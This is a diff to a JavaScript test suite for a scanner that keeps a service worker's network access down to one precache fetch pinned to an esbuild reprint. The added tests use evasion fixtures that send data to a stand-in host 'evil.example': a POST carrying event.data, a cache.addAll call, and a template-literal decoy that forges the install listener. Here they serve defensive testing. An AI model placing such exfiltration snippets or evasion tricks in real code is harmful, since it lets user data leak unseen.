@@ -7,6 +7,7 @@ import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, 
 import { tmpdir } from "node:os";
 import { dirname, join, relative } from "node:path";
 import { fileURLToPath, pathToFileURL } from "node:url";
+import { transformSync } from "esbuild";
 
 const root = dirname(dirname(fileURLToPath(import.meta.url)));
 const read = (path) => readFileSync(join(root, path), "utf8");
@@ -215,14 +216,36 @@ const mathRandomPattern = /\bMath\s*(?:\??\.\s*random\b|(?:\?\.)?\s*\[\s*["'`]ra
 
 // The service worker legitimately makes exactly one request: the precache
 // fetch in its install listener, for the two fixed same-origin documents.
-// That one exact line is exempt; any other network token anywhere in the
-// worker fails the scan.
+// That one exact line is exempt only inside the install listener. The
+// listener is pinned to its exact esbuild reprint, stored in the fixture
+// below: the block contains backticks and `${`, so it cannot be copied into
+// a template literal without escapes, and so it can only match as real code.
+// Changing the install listener (or upgrading esbuild in a way that reprints
+// it differently) means updating the fixture, a visible, reviewed step.
+// legalComments "none" drops `/*! */` comments, the only other raw text a
+// reprint keeps. Any other network token anywhere in the worker fails the
+// scan, and so does a cache.add/addAll call, which fetches from the network
+// with no fetch token.
 const workerFetchExemption = "const response = await fetch(request);";
+// cache.add/addAll fetch from the network with no fetch token; only the worker is checked.
+const workerCacheAddPattern = /\.\s*(?:add|addAll)\s*(?:\?\.\s*)?\(/;
+const workerInstallReprint = readFileSync(join(root, "test/fixtures/service-worker-install.reprint.txt"), "utf8").replace(/\n$/, "");
 const workerNetworkText = (text) => {
   const lines = text.split("\n");
   const found = lines.filter((line) => line.trim() === workerFetchExemption).length;
   assert.equal(found, 1, `src/service-worker.js must keep exactly one "${workerFetchExemption}" line, found ${found}`);
-  lines.splice(lines.findIndex((line) => line.trim() === workerFetchExemption), 1);
+  const at = lines.findIndex((line) => line.trim() === workerFetchExemption);
+  // The author's layout carries no meaning: esbuild's reprint normalizes it,
+  // so an indented `});` or indented top-level code cannot move the region.
+  // A worker that does not parse makes transformSync throw: fail closed.
+  const reprint = transformSync(text, { loader: "js", legalComments: "none" }).code;
+  const occurrences = (`\n${reprint}`).split(`\n${workerInstallReprint}\n`).length - 1;
+  const exempt = reprint.split("\n").filter((line) => line.trim() === workerFetchExemption).length;
+  assert.ok(
+    occurrences === 1 && exempt === 1,
+    `src/service-worker.js must keep "${workerFetchExemption}" inside its install listener`,
+  );
+  lines.splice(at, 1);
   return lines.join("\n");
 };
 
@@ -264,6 +287,77 @@ test("the service-worker exemption admits only its one precache fetch", () => {
   assert.match(workerNetworkText(injected), networkApiPattern, "a fetch added to the worker must be caught");
   const doubled = worker.replace(workerFetchExemption, `${workerFetchExemption}\n      ${workerFetchExemption}`);
   assert.throws(() => workerNetworkText(doubled), /exactly one/);
+  const moved = worker
+    .replace(`      ${workerFetchExemption}\n`, "")
+    .replace(
+      'self.addEventListener("activate",',
+      `self.addEventListener("message", (event) => {\n  event.waitUntil((async () => {\n    const request = event.request;\n    ${workerFetchExemption}\n  })());\n});\n\nself.addEventListener("activate",`,
+    );
+  assert.notEqual(moved, worker, "fixture: the exempt line must move out of the install listener");
+  assert.equal(moved.split("\n").filter((line) => line.trim() === workerFetchExemption).length, 1, "fixture: the moved worker keeps exactly one exempt line");
+  assert.throws(() => workerNetworkText(moved), /install listener/, "the exempt line must sit inside the install listener");
+  const afterInstall = worker
+    .replace(`      ${workerFetchExemption}\n`, "")
+    .replace(
+      'self.addEventListener("activate",',
+      `(async () => {\n  const request = new Request("https://evil.example/collect");\n  ${workerFetchExemption}\n})();\n\nself.addEventListener("activate",`,
+    );
+  assert.notEqual(afterInstall, worker, "fixture: the exempt line must move out of the install listener");
+  assert.equal(afterInstall.split("\n").filter((line) => line.trim() === workerFetchExemption).length, 1, "fixture: the moved worker keeps exactly one exempt line");
+  assert.throws(() => workerNetworkText(afterInstall), /install listener/, "the exempt line must sit inside the install listener, not in top-level code after it");
+  const indented = worker.replace("  })());\n});\n", "  })());\n  });\n");
+  assert.notEqual(indented, worker, "fixture: the install listener's closing line must be indented");
+  assert.doesNotThrow(() => workerNetworkText(indented));
+  const unclosed = `${worker}\n}`;
+  assert.notEqual(unclosed, worker, "fixture: the stray closing brace must change the worker");
+  assert.throws(() => workerNetworkText(unclosed), undefined, "a worker that does not parse must fail closed");
+  // Kimi K3's round-2 repro: the install callback closes with an indented
+  // `  });` and the top-level code after it is indented too, so a region found
+  // by layout would run on to the activate listener's column-0 `});`. The
+  // exempt fetch is in a top-level IIFE, outside the install listener.
+  const afterIndentedInstall = `self.addEventListener("install", (event) => {
+  event.waitUntil(self.skipWaiting());
+  });
+  (async () => {
+    const request = new Request("https://evil.example/collect");
+    ${workerFetchExemption}
+  })();
+  self.addEventListener("activate", () => {
+});
+`;
+  assert.equal(afterIndentedInstall.split("\n").filter((line) => line.trim() === workerFetchExemption).length, 1, "fixture: exactly one exempt line");
+  assert.throws(() => workerNetworkText(afterIndentedInstall), /install listener/, "an exempt fetch outside the install listener must fail whatever the worker's indentation");
+  assert.doesNotMatch(workerNetworkText(worker), workerCacheAddPattern, "the real worker must not call cache.add/addAll, which fetch from the network");
+  const cacheAdd = `${worker}\nself.addEventListener("message", () => caches.open("x").then((cache) => cache.addAll(["https://evil.example/"])));\n`;
+  assert.match(cacheAdd, workerCacheAddPattern, "cache.addAll must be caught by the worker-only pattern");
+  // The pinned block is esbuild's reprint of the real install listener; it
+  // must appear exactly once, so a string in a handler cannot forge it.
+  const reprint = transformSync(worker, { loader: "js", legalComments: "none" }).code;
+  assert.equal(
+    (`\n${reprint}`).split(`\n${workerInstallReprint}\n`).length - 1,
+    1,
+    "the pinned install-listener reprint must appear exactly once in the real worker",
+  );
+  const otherCache = worker.replace('cache: "reload"', 'cache: "no-store"');
+  assert.notEqual(otherCache, worker, "fixture: the install listener's cache mode must change");
+  assert.throws(() => workerNetworkText(otherCache), /install listener/, "an install listener that differs from the pinned reprint must fail");
+  // Kimi K3's round-3 repro: a message handler's template literal holds a
+  // column-0 `self.addEventListener("install",` line, so a region found by
+  // matching lines would start inside the string and end at the handler's own
+  // `});`, hiding the handler's fetch of event.data. The pinned reprint does
+  // not appear, so the worker is refused.
+  const spoofed = [
+    'self.addEventListener("message", async (event) => {',
+    '  const decoy = `',
+    'self.addEventListener("install",',
+    '  ${event.type}`;',
+    '  const request = new Request("https://evil.example/collect", { method: "POST", body: event.data, mode: "no-cors" });',
+    `  ${workerFetchExemption}`,
+    '});',
+    '',
+  ].join('\n');
+  assert.equal(spoofed.split("\n").filter((line) => line.trim() === workerFetchExemption).length, 1, "fixture: exactly one exempt line");
+  assert.throws(() => workerNetworkText(spoofed), /install listener/, "a template literal must not forge the install listener");
 });
 
 test("no source file opens a network connection", () => {
